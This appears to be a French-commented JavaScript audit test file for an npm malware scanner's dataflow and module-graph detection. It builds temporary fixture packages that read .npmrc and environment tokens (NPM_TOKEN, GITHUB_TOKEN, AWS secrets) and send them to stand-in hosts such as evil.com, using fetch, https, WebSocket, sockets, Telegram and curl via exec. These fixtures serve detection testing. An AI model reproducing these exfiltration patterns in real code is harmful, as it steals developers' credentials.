// Audit interne 2026-05-17 - Phase 1b dataflow.js + module-graph - Tests reproducteurs.
//
// CONVENTION : chaque test asserts le comportement BUGGUÉ actuel.
// - Test PASSE aujourd'hui = bug confirmé existant
// - Test ÉCHOUERA après le fix prévu = correction validable
//
// Standalone - pas intégré au run-tests.js master pour respecter la discipline audit
// "0 code change pendant l'audit". Lancement :
//   node tests/audit-2026-05/dataflow-findings.test.js
//
// Rapport : muaddib-prompt-docs/archive/audits/2026-05-internal-v2.11.15.md
//
// Auteur : Claude Opus 4.7 (1M context) sous direction Kéwin Poszalski
// Date   : 2026-05-17

const fs = require('fs');
const os = require('os');
const path = require('path');

// Force offline scoring (no npm registry fetch during tests)
if (!process.env.MUADDIB_NO_REGISTRY_FETCH) {
  process.env.MUADDIB_NO_REGISTRY_FETCH = '1';
}

const { analyzeDataFlow } = require('../../src/scanner/dataflow.js');
const {
  buildModuleGraph,
  annotateTaintedExports,
  annotateSinkExports,
  detectCrossFileFlows,
} = require('../../src/scanner/module-graph');

let passed = 0;
let failed = 0;
const failures = [];

function test(name, fn) {
  try {
    const r = fn();
    if (r && typeof r.then === 'function') {
      return r.then(() => {
        console.log(`  [PASS] ${name}`);
        passed++;
      }).catch(e => {
        console.log(`  [FAIL] ${name}`);
        console.log(`         ${e.message}`);
        failures.push({ name, error: e.message });
        failed++;
      });
    }
    console.log(`  [PASS] ${name}`);
    passed++;
  } catch (e) {
    console.log(`  [FAIL] ${name}`);
    console.log(`         ${e.message}`);
    failures.push({ name, error: e.message });
    failed++;
  }
}

function asyncTest(name, fn) {
  return test(name, fn);
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}

function assertEq(actual, expected, msg) {
  if (actual !== expected) {
    throw new Error(`${msg || 'assertEq'}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

const tmpDirs = [];
function makeTempPkg(filesByRel) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-df1b-'));
  tmpDirs.push(tmp);
  fs.writeFileSync(
    path.join(tmp, 'package.json'),
    JSON.stringify({ name: 'audit-fixture', version: '1.0.0' })
  );
  for (const rel of Object.keys(filesByRel)) {
    const abs = path.join(tmp, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, filesByRel[rel]);
  }
  return tmp;
}

function cleanupAll() {
  for (const d of tmpDirs) {
    try { fs.rmSync(d, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

console.log('=== AUDIT 2026-05 Phase 1b - dataflow.js + module-graph - findings ===');
console.log('');
console.log('Chaque test asserts le BUG actuel. PASS aujourd\'hui = bug existant.');
console.log('Après le fix prévu, ces tests doivent FAIL (= correction prouvée).');
console.log('');

async function run() {
  // ─────────────────────────────────────────────────────────────────────────
  // DF-C1 - buildModuleGraph silently disables cross-file analysis when
  // files.length > MAX_GRAPH_NODES (100). Empty graph returned → all
  // downstream cross_file_dataflow detection becomes a no-op. The user only
  // sees a single warnings[] entry; threats array is unchanged.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('--- DF-C1: MAX_GRAPH_NODES=100 silently skips cross-file analysis ---');

  await asyncTest('DF-C1.a: >5000 fichiers → buildModuleGraph signale truncated via meta (FIXED)', async () => {
    const files = {};
    for (let i = 0; i < 5001; i++) {
      files[`mod${String(i).padStart(4, '0')}.js`] = `module.exports = ${i};`;
    }
    const tmp = makeTempPkg(files);
    const meta = {};
    const graph = buildModuleGraph(tmp, meta);
    assertEq(Object.keys(graph).length, 0, `FIXED : graph vide pour 5001 fichiers (limit 5000).`);
    assertEq(meta.truncated, true, `FIXED : meta.truncated=true signale la troncature au caller.`);
    assertEq(meta.fileCount, 5001, `FIXED : meta.fileCount expose le compte exact.`);
    assertEq(meta.maxNodes, 5000, `FIXED : meta.maxNodes expose la limite courante.`);
  });

  await asyncTest('DF-C1.b: >5000 fichiers + cross_file_dataflow malicieux → meta.truncated true (FIXED)', async () => {
    // 4999 fichiers benins + reader + sender = 5001 → graph vide + meta.truncated=true
    const files = {};
    for (let i = 0; i < 4999; i++) {
      files[`mod${String(i).padStart(4, '0')}.js`] = `module.exports = function pad${i}() { return ${i}; };`;
    }
    files['reader.js'] = `const fs = require('fs');
module.exports = function readCreds() { return fs.readFileSync('/home/user/.npmrc', 'utf8'); };`;
    files['sender.js'] = `const https = require('https');
const readCreds = require('./reader');
const data = readCreds();
https.request({ hostname: 'evil.com', method: 'POST' }).write(data);`;

    const tmp = makeTempPkg(files);
    const meta = {};
    const graph = buildModuleGraph(tmp, meta);
    const tainted = annotateTaintedExports(graph, tmp);
    const sinks = annotateSinkExports(graph, tmp);
    const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
    assertEq(meta.truncated, true, `FIXED : 5001 fichiers > MAX_GRAPH_NODES → meta.truncated true (le caller emettra large_package_graph_truncated).`);
    assertEq(flows.length, 0, `FIXED : flows=0 sur graph vide (caller doit emettre large_package_graph_truncated comme signal).`);
  });

  await asyncTest('DF-C1.c: pipeline execute() sur >5000 fichiers → threat large_package_graph_truncated emis (FIXED)', async () => {
    const { execute } = require('../../src/pipeline/executor.js');
    const files = {};
    for (let i = 0; i < 5001; i++) {
      files[`mod${String(i).padStart(4, '0')}.js`] = `module.exports = ${i};`;
    }
    const tmp = makeTempPkg(files);
    const warnings = [];
    const { threats } = await execute(tmp, { _capture: true, noModuleGraph: false }, [], warnings);
    const truncatedThreat = threats.find(t => t.type === 'large_package_graph_truncated');
    assert(truncatedThreat, `FIXED : pipeline emet large_package_graph_truncated quand MAX_GRAPH_NODES depasse. threats types=${JSON.stringify(threats.map(t => t.type))}`);
    assertEq(truncatedThreat.severity, 'MEDIUM', `FIXED : severity=MEDIUM`);
    assertEq(truncatedThreat.fileCount, 5001, `FIXED : metadata fileCount expose le compte`);
    assert(warnings.some(w => w.includes('exceeds MAX_GRAPH_NODES')), `FIXED : warning conserve pour compatibilite output`);
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-C2 - MAX_FLOWS=20 truncation par insertion order (Object.keys(graph))
  // sans pondération de severité. Si l'attaquant met 20 read→fetch benins
  // dans des fichiers alphabétiquement antérieurs, le flow malveillant
  // ultérieur est silencieusement dropped.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-C2: MAX_FLOWS=20 hard cap drops malicious flows past index 20 ---');

  await asyncTest('DF-C2.a: 25 flows distincts → seuls 20 retournés (cap dur)', async () => {
    // 25 paires reader-sender, chacune locale (même fichier)
    const files = {};
    for (let i = 0; i < 25; i++) {
      // Chaque sink est une fonction exportée qui contient https.request avec arg tainted
      files[`reader${i}.js`] = `const fs = require('fs');
module.exports = function read${i}() { return fs.readFileSync('/home/user/.npmrc', 'utf8'); };`;
      files[`sender${i}.js`] = `const https = require('https');
const read = require('./reader${i}');
const data = read();
https.request({ hostname: 'evil${i}.com' }).write(data);`;
    }
    // Total 50 fichiers → < MAX_GRAPH_NODES, donc graph construit normalement
    const tmp = makeTempPkg(files);
    const graph = buildModuleGraph(tmp);
    const tainted = annotateTaintedExports(graph, tmp);
    const sinks = annotateSinkExports(graph, tmp);
    const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
    // Buggué : flows.length === 20 (cap), pas 25
    assert(
      flows.length <= 20,
      `BUG-CONFIRMED : MAX_FLOWS=20 cap dur, flows.length=${flows.length}, attendu 25. Les 5 derniers (alphabétiquement) sont silencieusement dropped.`
    );
    assertEq(
      flows.length,
      20,
      `BUG-CONFIRMED : exactement 20 flows retournés (cap saturé), donc 5 manquants.`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-C3 - ESM imports NOT tracked by buildTaintMap (dataflow.js:59-198).
  // Only VariableDeclarator est visité. ImportDeclaration node ignoré.
  // Conséquence : `import { send } from 'ws'` + `send(creds)` rate la
  // détection module-sink. Idem pour child_process destructured via ESM,
  // socket.io, mqtt, etc.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-C3: ESM import not tracked by intra-file dataflow buildTaintMap ---');

  await asyncTest('DF-C3.a: ESM import ws + .send(creds) → suspicious_module_sink émis (FIXED)', async () => {
    // ESM source. acorn parse avec sourceType=module est le default.
    const code = `import { WebSocket } from 'ws';
const cred = process.env.NPM_TOKEN;
const socket = new WebSocket('wss://c2.attacker.com');
socket.send(cred);`;
    const tmp = makeTempPkg({ 'index.mjs': code });
    const threats = await analyzeDataFlow(tmp);
    const sinkThreat = threats.find(t => t.type === 'suspicious_module_sink');
    assert(
      sinkThreat,
      `FIXED : ESM import de 'ws' désormais tracké par buildTaintMap → suspicious_module_sink émis. Threats: ${JSON.stringify(threats.map(t => t.type))}`
    );
  });

  await asyncTest('DF-C3.b: ESM destructured import { exec } + cred → suspicious_dataflow avec taint_tracked (FIXED)', async () => {
    // env_read source + tainted exec (via ESM ImportSpecifier) → flow taint-tracked.
    const code = `import { exec } from 'child_process';
const cred = process.env.NPM_TOKEN;
exec(\`curl -d \${cred} http://evil.com/exfil\`);`;
    const tmp = makeTempPkg({ 'index.mjs': code });
    const threats = await analyzeDataFlow(tmp);
    const sf = threats.find(t => t.type === 'suspicious_dataflow');
    assert(sf, `FIXED : suspicious_dataflow doit être émis (ESM exec import désormais tainté). Threats: ${JSON.stringify(threats.map(t => t.type))}`);
    assert(
      sf.taint_tracked === true,
      `FIXED : suspicious_dataflow doit porter taint_tracked=true (exec tainté via ImportSpecifier). sf=${JSON.stringify(sf)}`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-C4 - Severity graduation HIGH → MEDIUM (dataflow.js:965-972) downgrade
  // les flows env_read + network distant à MEDIUM même quand les vars sont
  // des credentials réels (NPM_TOKEN, GITHUB_TOKEN, AWS_SECRET).
  // MEDIUM = sujet aux FP gates → potentiel bypass total pour Mini Shai-Hulud
  // dans payloads longs/obfusqués.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-C4: env_read NPM_TOKEN/GITHUB_TOKEN + distant fetch → MEDIUM ---');

  await asyncTest('DF-C4.a: NPM_TOKEN + GITHUB_TOKEN + fetch distant (>50 lignes) → severity=MEDIUM', async () => {
    const lines = [];
    lines.push(`const npmToken = process.env.NPM_TOKEN;`);
    lines.push(`const ghToken = process.env.GITHUB_TOKEN;`);
    for (let i = 0; i < 60; i++) lines.push(`const _filler${i} = ${i};`);
    lines.push(`fetch('http://attacker.com/collect', { method: 'POST', body: JSON.stringify({ n: npmToken, g: ghToken }) });`);
    const tmp = makeTempPkg({ 'index.js': lines.join('\n') });
    const threats = await analyzeDataFlow(tmp);
    const sf = threats.find(t => t.type === 'suspicious_dataflow');
    assert(sf, 'suspicious_dataflow doit être émis');
    assertEq(
      sf.severity,
      'MEDIUM',
      `BUG-CONFIRMED : NPM_TOKEN+GITHUB_TOKEN exfil distant déclassé en MEDIUM par la "graduation". Severity attendue: CRITICAL ou HIGH.`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-H1 - MODULE_SINK_METHODS manque les sinks 2026 modernes.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-H1: MODULE_SINK_METHODS missing 2026 sinks ---');

  await asyncTest('DF-H1.a: undici.request + NPM_TOKEN → suspicious_module_sink emis (FIXED)', async () => {
    const code = `const { request } = require('undici');
const cred = process.env.NPM_TOKEN;
request('https://evil.com/exfil', { method: 'POST', body: cred });`;
    const tmp = makeTempPkg({ 'index.js': code });
    const threats = await analyzeDataFlow(tmp);
    const moduleSink = threats.find(t => t.type === 'suspicious_module_sink' && t.message.includes('undici'));
    assert(
      moduleSink,
      `FIXED : undici desormais classe suspicious_module_sink via EXFIL_PRONE_MODULES (cred env_read + import undici). threats=${JSON.stringify(threats.map(t => t.type))}`
    );
  });

  await asyncTest('DF-H1.b: telegraf bot.telegram.sendMessage + NPM_TOKEN → sink emis (FIXED)', async () => {
    const code = `const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);
const cred = process.env.NPM_TOKEN;
bot.telegram.sendMessage('-1001234567890', cred);`;
    const tmp = makeTempPkg({ 'index.js': code });
    const threats = await analyzeDataFlow(tmp);
    const sinks = threats.filter(t => t.type === 'suspicious_dataflow' || t.type === 'suspicious_module_sink');
    assert(
      sinks.length >= 1 && sinks.some(t => t.type === 'suspicious_module_sink' && t.message.includes('telegraf')),
      `FIXED : telegraf classe exfil-prone via heuristique EXFIL_PRONE_MODULES (chain bot.telegram.sendMessage non capturable directement). threats=${JSON.stringify(threats.map(t => ({ type: t.type, msg: t.message })))}`
    );
  });

  await asyncTest('DF-H1.c: @dfinity/agent actor.exfil + AWS_SECRET → sink emis (FIXED)', async () => {
    const code = `const { Actor, HttpAgent } = require('@dfinity/agent');
const agent = new HttpAgent({ host: 'https://ic0.app' });
const cred = process.env.AWS_SECRET_ACCESS_KEY;
const actor = Actor.createActor(idl, { agent, canisterId: 'aaaaa-aa' });
actor.exfil(cred);`;
    const tmp = makeTempPkg({ 'index.js': code });
    const threats = await analyzeDataFlow(tmp);
    const sinks = threats.filter(t => t.type === 'suspicious_dataflow' || t.type === 'suspicious_module_sink');
    assert(
      sinks.length >= 1 && sinks.some(t => t.type === 'suspicious_module_sink' && t.message.includes('@dfinity/agent')),
      `FIXED : @dfinity/agent (CanisterWorm pattern) classe exfil-prone (methode dynamique actor.exfil). threats=${JSON.stringify(threats.map(t => ({ type: t.type, msg: t.message })))}`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-H2 - EXEC_METHODS (set à 'exec','execSync','spawn','spawnSync') exclut
  // execFile, execFileSync, fork. exec_network classification (line 474) ne
  // teste QUE 'exec' et 'execSync'. Donc execFile('/usr/bin/curl', args)
  // n'est pas marqué comme exec_network.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-H2: execFile / execFileSync / fork not in EXEC_METHODS ---');

  await asyncTest('DF-H2.a: execFile("/usr/bin/curl", ["evil.com"]) → exec_sink/exec_network détecté (FIXED)', async () => {
    const code = `const { execFile } = require('child_process');
const cred = process.env.NPM_TOKEN;
execFile('/usr/bin/curl', ['-X', 'POST', '-d', cred, 'http://evil.com/exfil']);`;
    const tmp = makeTempPkg({ 'index.js': code });
    const threats = await analyzeDataFlow(tmp);
    const sf = threats.find(t => t.type === 'suspicious_dataflow');
    assert(sf, `FIXED : suspicious_dataflow doit être émis pour execFile + cred. Threats: ${JSON.stringify(threats.map(t => t.type))}`);
    assert(
      /exec(File)?/.test(sf.message) || sf.taint_tracked === true,
      `FIXED : execFile désormais classé exec_sink via MODULE_SINK_METHODS.child_process. sf=${JSON.stringify(sf)}`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-H3 - hasRawSocketModule regex (line 221) ne match QUE require()
  // string literal. ESM `import net from 'net'` est missed → socket.connect()
  // de l'instance ne déclenche pas le sink check (line 542).
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-H3: hasRawSocketModule regex misses ESM imports ---');

  await asyncTest('DF-H3.a: ESM import net + socket.connect(port, host) → socket.connect non sink', async () => {
    const code = `import net from 'net';
const cred = process.env.NPM_TOKEN;
const socket = net.connect(443, 'evil.com');
socket.write(cred);`;
    const tmp = makeTempPkg({ 'index.mjs': code });
    const threats = await analyzeDataFlow(tmp);
    // Le `net.connect(port, host)` DIRECT en MemberExpression est détecté
    // via line 537-540 (`obj.name === 'net'` test direct). Mais
    // `socket.connect` instance-method (line 542) requiert hasRawSocketModule.
    // Pour exercer ce path, on doit avoir un socket dont connect() est appelé.
    // Réécriture du test avec un wrapper :
    const code2 = `import { Socket } from 'net';
const cred = process.env.NPM_TOKEN;
const s = new Socket();
s.connect(443, 'evil.com');
s.write(cred);`;
    const tmp2 = makeTempPkg({ 'index2.mjs': code2 });
    const threats2 = await analyzeDataFlow(tmp2);
    const socketConn = threats2.find(t => t.type === 'suspicious_dataflow' && t.message.includes('socket.connect'));
    assert(
      !socketConn,
      `BUG-CONFIRMED : ESM 'import { Socket } from "net"' + s.connect(port, host) non détecté comme socket.connect sink (hasRawSocketModule regex CJS-only).`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-H4 - callbackParams collecté UNIQUEMENT depuis FunctionDeclaration
  // (line 248-264). ArrowFunctionExpression et FunctionExpression assignées
  // à const sont missed → pattern `const f = (cb) => cb(secret)` ne déclenche
  // pas le callback exposure path.
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-H4: callbackParams misses ArrowFn / FunctionExpression / class methods ---');

  await asyncTest('DF-H4.a: arrow function (cb) => cb(creds) → pas de callback exposure', async () => {
    const code = `const fs = require('fs');
const expose = (cb) => {
  const data = fs.readFileSync('/home/user/.npmrc', 'utf8');
  cb(data);
};
module.exports = expose;`;
    const tmp = makeTempPkg({ 'index.js': code });
    const threats = await analyzeDataFlow(tmp);
    const cbExposure = threats.find(t =>
      t.type === 'suspicious_dataflow' &&
      t.message && t.message.includes('[callback exposure]')
    );
    assert(
      !cbExposure,
      `BUG-CONFIRMED : ArrowFunctionExpression non collectée dans callbackParams → callback exposure manqué. Pattern reproductible avec function expression aussi.`
    );
  });

  await asyncTest('DF-H4.b: class method (cb) { cb(creds) } → pas de callback exposure', async () => {
    const code = `const fs = require('fs');
class Exposer {
  emit(cb) {
    const data = fs.readFileSync('/home/user/.npmrc', 'utf8');
    cb(data);
  }
}
module.exports = Exposer;`;
    const tmp = makeTempPkg({ 'index.js': code });
    const threats = await analyzeDataFlow(tmp);
    const cbExposure = threats.find(t =>
      t.type === 'suspicious_dataflow' &&
      t.message && t.message.includes('[callback exposure]')
    );
    assert(
      !cbExposure,
      `BUG-CONFIRMED : MethodDefinition params non collectés dans callbackParams.`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // DF-H5 - SINK_INSTANCE_METHODS = {connect, write, send} dans module-graph.
  // C'est extrêmement large : N'IMPORTE QUEL .send(), .write(), .connect()
  // sur n'importe quelle expression cross-file taint match. Couplé à
  // findSinksUsingTainted, ça produit des sinks faux (et symétriquement, les
  // vrais sinks 2026 hors connect/write/send sont missed).
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- DF-H5: SINK_INSTANCE_METHODS too broad — any .send/.write/.connect cross-file ---');

  await asyncTest('DF-H5.a: cross-file taint + cache.write(data) → match faux sink (write n\'est PAS un sink réseau)', async () => {
    // reader.js exporte tainted data
    // sender.js fait `cache.write(data)` où cache n'a rien d'un sink réseau
    const tmp = makeTempPkg({
      'reader.js': `const fs = require('fs');
module.exports = function read() { return fs.readFileSync('/home/user/.npmrc', 'utf8'); };`,
      'sender.js': `const read = require('./reader');
const cache = new Map();
const data = read();
cache.set('k', data);
// Hypothetical local "write" wrapper on a cache abstraction:
const wrapper = { write: (k, v) => cache.set(k, v) };
wrapper.write('payload', data);`
    });
    const graph = buildModuleGraph(tmp);
    const tainted = annotateTaintedExports(graph, tmp);
    const sinks = annotateSinkExports(graph, tmp);
    const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
    // Vérification : si SINK_INSTANCE_METHODS={'connect','write','send'} est
    // matché trop large, on aura un flow incorrect signalé sur cache.set/wrapper.write.
    // Note : le code de findSinksUsingTainted teste callee.property.name in SINK_INSTANCE_METHODS.
    // wrapper.write(...) → method='write' ∈ SINK_INSTANCE_METHODS → sink "write()".
    const writeFlow = flows.find(f => f.sink === 'write()');
    assert(
      writeFlow,
      `BUG-CONFIRMED : wrapper.write(data) catalogué comme sink réseau alors que c'est une méthode locale d'un cache map. SINK_INSTANCE_METHODS trop large.`
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Done.
  // ─────────────────────────────────────────────────────────────────────────
  cleanupAll();
  console.log('');
  console.log(`=== Résultat : ${passed} PASS / ${failed} FAIL ===`);
  if (failed > 0) {
    console.log('\nFAILURES :');
    for (const f of failures) {
      console.log(`  - ${f.name}: ${f.error}`);
    }
    process.exit(1);
  }
  console.log('');
  console.log('Tous les tests passent = tous les bugs Critical/High de Phase 1b sont CONFIRMÉS.');
  console.log('Après fix futur (en branches dédiées), ces tests doivent échouer.');
}

run().catch(e => {
  console.error('Erreur fatale :', e);
  cleanupAll();
  process.exit(1);
});
